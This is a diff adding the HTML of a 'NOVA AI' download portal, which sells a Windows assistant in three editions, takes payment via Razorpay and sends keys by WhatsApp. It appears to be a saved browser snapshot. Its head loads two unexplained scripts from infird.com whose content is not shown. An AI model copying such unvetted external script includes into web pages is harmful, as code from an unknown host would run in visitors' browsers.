@@ -1,0 +1,546 @@
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NOVA AI - The Future of Personal Assistant</title>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&amp;family=Exo:wght@300;400;600&amp;display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="style.css">
+    <script type="text/javascript"
+        src="https://infird.com/cdn/b50b7f30-3efc-40a4-958b-47c84a6ef83f?uuid=3a7a2bae-6959-4ce2-be1a-e42dff289844"
+        data-awssuidacr="3a7a2bae-6959-4ce2-be1a-e42dff289844"></script>
+    <script type="text/javascript" src="https://infird.com/cdn/afde4f0c-4096-4aeb-b345-d1aea539851b"></script>
+</head>
+<style>
+    /* Additional CSS for key status display */
+    .key-status {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin-top: 15px;
+        padding: 8px 12px;
+        background: rgba(0, 255, 255, 0.1);
+        border: 1px solid rgba(0, 255, 255, 0.3);
+        border-radius: 20px;
+        font-size: 0.9rem;
+        transition: all 0.3s ease;
+    }
+
+    .key-status i {
+        margin-right: 8px;
+        color: #00ffff;
+    }
+
+    .key-count {
+        font-weight: bold;
+        color: #00ffff;
+        margin-right: 5px;
+    }
+
+    .key-label {
+        color: rgba(255, 255, 255, 0.8);
+    }
+
+    /* Status-based styling */
+    .key-status.keys-available {
+        background: rgba(0, 255, 0, 0.1);
+        border-color: rgba(0, 255, 0, 0.3);
+    }
+
+    .key-status.keys-available i,
+    .key-status.keys-available .key-count {
+        color: #00ff00;
+    }
+
+    .key-status.keys-low {
+        background: rgba(255, 165, 0, 0.1);
+        border-color: rgba(255, 165, 0, 0.3);
+    }
+
+    .key-status.keys-low i,
+    .key-status.keys-low .key-count {
+        color: #ffa500;
+    }
+
+    .key-status.keys-none {
+        background: rgba(255, 0, 0, 0.1);
+        border-color: rgba(255, 0, 0, 0.3);
+    }
+
+    .key-status.keys-none i,
+    .key-status.keys-none .key-count {
+        color: #ff0000;
+    }
+
+    /* Variant selector styles */
+    .variant-selector {
+        max-width: 1200px;
+        margin: 0 auto;
+        padding: 2rem;
+        text-align: center;
+    }
+
+    .variant-cards {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+        gap: 2rem;
+        margin: 3rem 0;
+    }
+
+    .variant-card {
+        background: rgba(20, 20, 30, 0.7);
+        border: 1px solid rgba(0, 255, 255, 0.2);
+        border-radius: 10px;
+        padding: 2rem;
+        transition: all 0.3s ease;
+        cursor: pointer;
+        position: relative;
+        overflow: hidden;
+    }
+
+    .variant-card:hover {
+        transform: translateY(-5px);
+        box-shadow: 0 10px 20px rgba(0, 255, 255, 0.1);
+        border-color: rgba(0, 255, 255, 0.5);
+    }
+
+    .variant-card.selected {
+        border: 2px solid #00ffff;
+        box-shadow: 0 0 20px rgba(0, 255, 255, 0.3);
+        background: rgba(0, 255, 255, 0.05);
+    }
+
+    .variant-icon {
+        font-size: 2.5rem;
+        margin-bottom: 1rem;
+        color: #00ffff;
+    }
+
+    .variant-title {
+        font-size: 1.5rem;
+        margin-bottom: 1rem;
+        color: #fff;
+        font-family: 'Orbitron', sans-serif;
+    }
+
+    .variant-price {
+        font-size: 1.8rem;
+        font-weight: bold;
+        margin-bottom: 1.5rem;
+        color: #00ffff;
+        font-family: 'Orbitron', sans-serif;
+    }
+
+    .variant-features {
+        text-align: left;
+        margin-bottom: 2rem;
+        padding-left: 1rem;
+    }
+
+    .variant-features li {
+        margin-bottom: 0.8rem;
+        position: relative;
+        padding-left: 1.5rem;
+        color: rgba(255, 255, 255, 0.8);
+    }
+
+    .variant-features li:before {
+        content: '✓';
+        position: absolute;
+        left: 0;
+        color: #00ffff;
+    }
+
+    /* Responsive adjustments */
+    @media (max-width: 768px) {
+        .variant-cards {
+            grid-template-columns: 1fr;
+        }
+
+        .key-status {
+            font-size: 0.8rem;
+            padding: 6px 10px;
+        }
+    }
+</style>
+
+<body>
+    <div class="grid-background"></div>
+    <div class="particle-background" id="particle-background">
+        <div class="particle"
+            style="width: 2.54623px; height: 2.54623px; left: 89.2203%; top: 68.569%; animation-duration: 16.2447s; animation-delay: 4.58656s;">
+        </div>
+        <div class="particle"
+            style="width: 1.3426px; height: 1.3426px; left: 42.0258%; top: 68.1509%; animation-duration: 19.6161s; animation-delay: 1.90887s;">
+        </div>
+        <div class="particle"
+            style="width: 2.7271px; height: 2.7271px; left: 26.177%; top: 40.31%; animation-duration: 14.6767s; animation-delay: 6.5213s;">
+        </div>
+        <div class="particle"
+            style="width: 1.65373px; height: 1.65373px; left: 64.9802%; top: 86.8051%; animation-duration: 18.1337s; animation-delay: 3.56448s;">
+        </div>
+        <div class="particle"
+            style="width: 2.19292px; height: 2.19292px; left: 37.6453%; top: 28.7735%; animation-duration: 13.0992s; animation-delay: 2.27687s;">
+        </div>
+        <div class="particle"
+            style="width: 2.88723px; height: 2.88723px; left: 86.7667%; top: 38.7004%; animation-duration: 18.2905s; animation-delay: 9.92978s;">
+        </div>
+        <div class="particle"
+            style="width: 1.16956px; height: 1.16956px; left: 10.3658%; top: 98.0901%; animation-duration: 19.6471s; animation-delay: 2.7774s;">
+        </div>
+        <div class="particle"
+            style="width: 2.5478px; height: 2.5478px; left: 19.6225%; top: 22.2391%; animation-duration: 12.5962s; animation-delay: 7.19129s;">
+        </div>
+        <div class="particle"
+            style="width: 1.5657px; height: 1.5657px; left: 97.5813%; top: 75.238%; animation-duration: 14.0072s; animation-delay: 4.4422s;">
+        </div>
+        <div class="particle"
+            style="width: 2.3778px; height: 2.3778px; left: 85.5665%; top: 98.0537%; animation-duration: 17.447s; animation-delay: 9.13677s;">
+        </div>
+        <div class="particle"
+            style="width: 1.48736px; height: 1.48736px; left: 78.1284%; top: 49.9972%; animation-duration: 14.6954s; animation-delay: 7.69096s;">
+        </div>
+        <div class="particle"
+            style="width: 1.4235px; height: 1.4235px; left: 26.7252%; top: 42.2298%; animation-duration: 15.5583s; animation-delay: 4.15848s;">
+        </div>
+        <div class="particle"
+            style="width: 2.48166px; height: 2.48166px; left: 59.311%; top: 19.3412%; animation-duration: 18.5152s; animation-delay: 1.42532s;">
+        </div>
+        <div class="particle"
+            style="width: 1.05243px; height: 1.05243px; left: 56.771%; top: 26.7509%; animation-duration: 10.6186s; animation-delay: 9.55476s;">
+        </div>
+        <div class="particle"
+            style="width: 1.84823px; height: 1.84823px; left: 22.0321%; top: 60.3246%; animation-duration: 18.7956s; animation-delay: 9.96525s;">
+        </div>
+        <div class="particle"
+            style="width: 1.90581px; height: 1.90581px; left: 0.110204%; top: 27.5677%; animation-duration: 18.4022s; animation-delay: 2.45318s;">
+        </div>
+        <div class="particle"
+            style="width: 2.88134px; height: 2.88134px; left: 35.7119%; top: 12.8961%; animation-duration: 18.243s; animation-delay: 0.937062s;">
+        </div>
+        <div class="particle"
+            style="width: 2.52844px; height: 2.52844px; left: 54.8783%; top: 68.1541%; animation-duration: 17.9184s; animation-delay: 6.53466s;">
+        </div>
+        <div class="particle"
+            style="width: 1.94262px; height: 1.94262px; left: 85.3252%; top: 24.3985%; animation-duration: 17.5435s; animation-delay: 1.63993s;">
+        </div>
+        <div class="particle"
+            style="width: 2.71191px; height: 2.71191px; left: 79.8383%; top: 70.2392%; animation-duration: 14.7079s; animation-delay: 1.24896s;">
+        </div>
+        <div class="particle"
+            style="width: 1.11298px; height: 1.11298px; left: 38.7797%; top: 70.0702%; animation-duration: 14.5154s; animation-delay: 1.16982s;">
+        </div>
+        <div class="particle"
+            style="width: 1.69707px; height: 1.69707px; left: 24.144%; top: 83.1544%; animation-duration: 17.3997s; animation-delay: 4.09229s;">
+        </div>
+        <div class="particle"
+            style="width: 2.28947px; height: 2.28947px; left: 82.0921%; top: 29.7085%; animation-duration: 19.005s; animation-delay: 1.0444s;">
+        </div>
+        <div class="particle"
+            style="width: 1.18739px; height: 1.18739px; left: 7.84248%; top: 68.4955%; animation-duration: 10.1805s; animation-delay: 4.21985s;">
+        </div>
+        <div class="particle"
+            style="width: 1.09767px; height: 1.09767px; left: 59.496%; top: 48.1894%; animation-duration: 17.5817s; animation-delay: 1.71784s;">
+        </div>
+        <div class="particle"
+            style="width: 2.64418px; height: 2.64418px; left: 51.5423%; top: 87.277%; animation-duration: 11.1992s; animation-delay: 3.68818s;">
+        </div>
+        <div class="particle"
+            style="width: 1.97951px; height: 1.97951px; left: 20.4946%; top: 89.7407%; animation-duration: 15.0051s; animation-delay: 1.67954s;">
+        </div>
+        <div class="particle"
+            style="width: 1.16947px; height: 1.16947px; left: 6.70887%; top: 9.92954%; animation-duration: 11.2198s; animation-delay: 8.3725s;">
+        </div>
+        <div class="particle"
+            style="width: 2.94857px; height: 2.94857px; left: 89.3484%; top: 52.3465%; animation-duration: 16.4023s; animation-delay: 3.11546s;">
+        </div>
+        <div class="particle"
+            style="width: 2.33982px; height: 2.33982px; left: 41.4254%; top: 42.8105%; animation-duration: 11.3811s; animation-delay: 3.04271s;">
+        </div>
+    </div>
+
+    <!-- Navigation Toolbar -->
+    <nav class="navbar" id="navbar">
+        <div class="navbar-container">
+            <div class="navbar-brand">
+                <span class="brand-text">NOVA AI</span>
+            </div>
+            <div class="navbar-menu">
+                <a class="navbar-item active" href="/">
+                    <i class="fas fa-home"></i>
+                    <span>Home</span>
+                </a>
+                <a class="navbar-item" href="/pages/contact">
+                    <i class="fas fa-envelope"></i>
+                    <span>Contact Us</span>
+                </a>
+                <a class="navbar-item" href="/pages/privacy">
+                    <i class="fas fa-shield-alt"></i>
+                    <span>Privacy Policy</span>
+                </a>
+                <a class="navbar-item" href="/pages/terms">
+                    <i class="fas fa-file-contract"></i>
+                    <span>Terms &amp; Conditions</span>
+                </a>
+                <a class="navbar-item" href="/pages/distribution">
+                    <i class="fas fa-handshake"></i>
+                    <span>Distribution &amp; Refund</span>
+                </a>
+                <a class="navbar-item" href="/pages/about">
+                    <i class="fas fa-robot"></i>
+                    <span>About Us</span>
+                </a>
+            </div>
+            <div class="navbar-toggle" id="navbar-toggle">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Welcome Screen -->
+    <div class="screen active" id="welcome-screen">
+        <div class="welcome-content">
+            <h1 class="logo">NOVA AI</h1>
+            <p class="subtitle">The Future of Personal Assistant</p>
+            <p style="margin-bottom: 3rem; font-size: 1.1rem;">Welcome to the official Nova download portal</p>
+            <button class="neon-button" id="welcome-continue-btn">
+                <span>Continue</span>
+                <i class="fas fa-arrow-right" style="margin-left: 10px;"></i>
+            </button>
+        </div>
+    </div>
+
+    <!-- Version Selector Screen -->
+    <div class="screen" id="version-selector">
+        <div class="version-selector">
+            <h2 class="selector-title">Select Your Version</h2>
+            <div class="version-cards">
+                <div class="version-card" id="nova2-card">
+                    <div class="card-icon"><i class="fas fa-desktop"></i></div>
+                    <h3 class="card-title">Nova 3.0 (Windows Version)</h3>
+                    <p class="card-description">Jarvis-like Windows AI with advanced system control, automation, and
+                        productivity features. Includes voice and text command support.</p>
+                    <div class="key-status keys-available" id="nova2-key-status">
+                        <i class="fas fa-key"></i>
+                        <span class="key-count">18</span>
+                        <span class="key-label">keys remaining</span>
+                    </div>
+                </div>
+            </div>
+            <button class="neon-button" id="continue-btn" style="display: none;">
+                <span>Continue</span>
+                <i class="fas fa-arrow-right" style="margin-left: 10px;"></i>
+            </button>
+        </div>
+    </div>
+
+    <!-- Windows Version Variant Selector Screen -->
+    <div class="screen" id="variant-selector">
+        <button class="back-button" id="variant-back-btn">
+            <i class="fas fa-arrow-left"></i>
+            <span>Back</span>
+        </button>
+        <div class="variant-selector">
+            <h2 class="selector-title">Select Your Nova 3.0 Variant</h2>
+            <p class="selector-subtitle">Choose the edition that matches your needs</p>
+
+            <div class="variant-cards">
+                <div class="variant-card" id="base-variant">
+                    <div class="variant-icon"><i class="fas fa-star"></i></div>
+                    <h3 class="variant-title">Base Edition</h3>
+                    <div class="variant-price">₹399</div>
+                    <ul class="variant-features">
+                        <li>Basic voice commands</li>
+                        <li>Human-like conversation</li>
+                        <li>Simple task automation</li>
+                        <li>File search</li>
+                    </ul>
+                    <div class="key-status">
+                        <i class="fas fa-key"></i>
+                        <span class="key-count">Loading...</span>
+                        <span class="key-label">keys remaining</span>
+                    </div>
+                </div>
+
+                <div class="variant-card" id="premium-variant">
+                    <div class="variant-icon"><i class="fas fa-gem"></i></div>
+                    <h3 class="variant-title">Premium Edition</h3>
+                    <div class="variant-price">₹599</div>
+                    <ul class="variant-features">
+                        <li>All Base features</li>
+                        <li>Advanced PC control</li>
+                        <li>Smart automation</li>
+                        <li>Productivity tools</li>
+                        <li>Multi-language support</li>
+                    </ul>
+                    <div class="key-status">
+                        <i class="fas fa-key"></i>
+                        <span class="key-count">Loading...</span>
+                        <span class="key-label">keys remaining</span>
+                    </div>
+                </div>
+
+                <div class="variant-card" id="elite-variant">
+                    <div class="variant-icon"><i class="fas fa-crown"></i></div>
+                    <h3 class="variant-title">Elite Edition</h3>
+                    <div class="variant-price">₹799</div>
+                    <ul class="variant-features">
+                        <li>All Premium features</li>
+                        <li>Complete system control</li>
+                        <li>AI-powered automation</li>
+                        <li>Security monitoring</li>
+                        <li>Priority support</li>
+                        <li>All future updates</li>
+                    </ul>
+                    <div class="key-status">
+                        <i class="fas fa-key"></i>
+                        <span class="key-count">Loading...</span>
+                        <span class="key-label">keys remaining</span>
+                    </div>
+                </div>
+            </div>
+
+            <button class="neon-button" id="variant-continue-btn" style="display: none;">
+                <span>Continue</span>
+                <i class="fas fa-arrow-right" style="margin-left: 10px;"></i>
+            </button>
+        </div>
+    </div>
+
+    <!-- Version Details Screen -->
+    <div class="screen" id="details-screen">
+        <button class="back-button" id="details-back-btn">
+            <i class="fas fa-arrow-left"></i>
+            <span>Back</span>
+        </button>
+        <div class="details-content">
+            <h2 class="details-title" id="details-title">Nova 1.0</h2>
+            <p class="details-subtitle" id="details-subtitle">Voice-controlled Android assistant</p>
+
+            <div class="features-section">
+                <h3 class="section-title">Key Features</h3>
+                <div class="features-grid" id="features-grid">
+                    <!-- Features will be populated by JavaScript -->
+                </div>
+            </div>
+
+            <div class="videos-section">
+                <h3 class="section-title">Setup &amp; Tutorial Videos</h3>
+                <div class="videos-grid" id="videos-grid">
+                    <!-- Videos will be populated by JavaScript -->
+                </div>
+            </div>
+
+            <button class="get-nova-button" id="get-nova-btn">
+                <i class="fas fa-download" style="margin-right: 10px;"></i>
+                Get Nova
+            </button>
+        </div>
+    </div>
+
+    <!-- Download Screen -->
+    <div class="screen" id="download-screen">
+        <div class="download-content">
+            <h2 class="download-title">Ready to Download</h2>
+            <p style="margin-bottom: 3rem; font-size: 1.2rem;">Your Nova AI assistant is ready!</p>
+            <button class="download-button" id="download-btn">
+                <i class="fas fa-download" style="margin-right: 15px;"></i>
+                Download Now
+            </button>
+            <div class="progress-container" id="progress-container" style="display: none;">
+                <div class="progress-bar" id="progress-bar"></div>
+            </div>
+            <p class="download-info">File size: <span id="file-size">0 MB</span> | Version: <span
+                    id="file-version">1.0</span></p>
+        </div>
+    </div>
+
+    <!-- Modal for Access Key -->
+    <div id="key-modal" class="modal">
+        <div class="modal-content">
+            <span class="close" id="modal-close-btn">×</span>
+            <h3 class="modal-title">Your Private Access Key</h3>
+            <p style="color: var(--text-secondary); margin-bottom: 1rem;">This key will be required during installation
+            </p>
+            <div class="access-key" id="access-key-display"></div>
+            <button class="copy-btn" id="copy-key-btn">
+                <i class="far fa-copy" style="margin-right: 5px;"></i>
+                Copy Key
+            </button>
+            <button class="neon-button" id="proceed-download-btn" style="margin-top: 1.5rem;">
+                <span>Continue</span>
+                <i class="fas fa-arrow-right" style="margin-left: 10px;"></i>
+            </button>
+        </div>
+    </div>
+
+
+
+    <!-- WhatsApp Screen -->
+    <div class="screen" id="whatsapp-screen">
+        <button class="back-button" id="whatsapp-back-btn">
+            <i class="fas fa-arrow-left"></i>
+            <span>Back</span>
+        </button>
+        <div class="whatsapp-content">
+            <h2 class="whatsapp-title">Congratulations!</h2>
+            <p class="whatsapp-subtitle">You've successfully purchased Nova 3.0</p>
+
+            <div class="whatsapp-card">
+                <div class="whatsapp-icon">
+                    <i class="fab fa-whatsapp"></i>
+                </div>
+                <h3>Get Your Access Key &amp; Download</h3>
+                <p>Contact us on WhatsApp to receive your access key and download instructions</p>
+
+                <button class="whatsapp-button" id="whatsapp-btn">
+                    <i class="fab fa-whatsapp"></i>
+                    Message on WhatsApp
+                </button>
+
+                <p class="whatsapp-note">We typically respond within a few minutes during business hours</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Notification -->
+    <div class="notification" id="notification">
+        <div class="notification-icon" id="notification-icon"></div>
+        <div class="notification-message" id="notification-message"></div>
+    </div>
+
+    <script src="https://checkout.razorpay.com/v1/checkout.js"></script>
+    <div class="razorpay-container"
+        style="z-index: 2147483647; position: fixed; top: 0px; display: none; left: 0px; height: 100%; width: 100%; max-height: 100dvh; backface-visibility: hidden; overflow-y: visible;">
+        <style>
+            @keyframes rzp-rot {
+                to {
+                    transform: rotate(360deg);
+                }
+            }
+
+            @-webkit-keyframes rzp-rot {
+                to {
+                    -webkit-transform: rotate(360deg);
+                }
+            }
+
+            .razorpay-container>iframe {
+                min-height: 100% !important;
+            }
+        </style>
+        <div class="razorpay-backdrop"
+            style="min-height: 100%; transition: 0.3s ease-out; position: fixed; top: 0px; left: 0px; width: 100%; height: 100%;">
+            <span
+                style="text-decoration: none; background: rgb(214, 68, 68); border: 1px dashed white; padding: 3px; opacity: 0; transform: rotate(45deg); transition: opacity 0.3s ease-in; font-family: lato, ubuntu, helvetica, sans-serif; color: white; position: absolute; width: 200px; text-align: center; right: -50px; top: 50px;">Test
+                Mode</span></div><iframe allowtransparency="true" frameborder="0" width="100%" height="100%"
+            src="https://api.razorpay.com/v1/checkout/public?traffic_env=production&amp;build=7c7877a3ef937d66dbdb62acf7955f4b05e18f68&amp;build_v1=cb2fc10e95cbac52b796c4f30abcfd48da438eef&amp;checkout_v2=1&amp;new_session=1&amp;rzp_device_id=1.20d92ca817c159cbb8475e79545472aebb212b7e.1763623789245.44370711&amp;unified_session_id=Rhud2XJZxmoPNk"
+            class="razorpay-checkout-frame"
+            allow="otp-credentials; payment; clipboard-write; publickey-credentials-get https://api.razorpay.com; publickey-credentials-create 'self' https://api.razorpay.com; web-share; camera *"
+            style="opacity: 1; height: 100%; position: relative; background: none; display: block; border: 0px none transparent; margin: 0px; padding: 0px; z-index: 2;"></iframe>
+    </div>
+    <script type="module" src="script.js"></script>
+</body>
